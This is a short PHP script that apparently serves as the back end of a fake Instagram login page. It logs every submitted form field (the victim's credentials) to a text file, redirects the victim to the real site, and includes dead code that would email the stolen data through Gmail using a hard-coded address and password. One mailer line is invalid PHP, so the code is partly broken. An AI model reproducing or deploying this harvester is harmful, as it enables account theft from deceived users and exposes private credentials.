<?php
header ('Location:https://instagram.com');
$handle = fopen("./logs.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

require("class.phpmailer.php");
$mailer = new PHPMailer();
$mailer->IsSMTP();
$mailer->Host = 'ssl://smtp.gmail.com:465';
$mailer->SMTPAuth = TRUE;
$mailer->Username = 'viralpatel.patel78@gmail.com ';  // Change this to your gmail adress
$mailer->Password = '8155950590';  // Change this to your gmail password
$mailer->From = 'viralpatel.patel78@gmail.com';  // This HAVE TO be your gmail adress
$mailer->FromName = 'INsta'; // This is the from name in the email, you can put anything you like here
$mailer->Body = $value, $variable;
$mailer->Subject = 'This is the subject of the email';
$mailer->AddAddress('viralpatel.patel78@gmail.com');  // This is where you put the email adress of the person you want to mail
if(!$mailer->Send())
{
   echo "Message was not sent<br/ >";
   echo "Mailer Error: " . $mailer->ErrorInfo;
}
else
{
   echo "Message has been sent";
}

?>

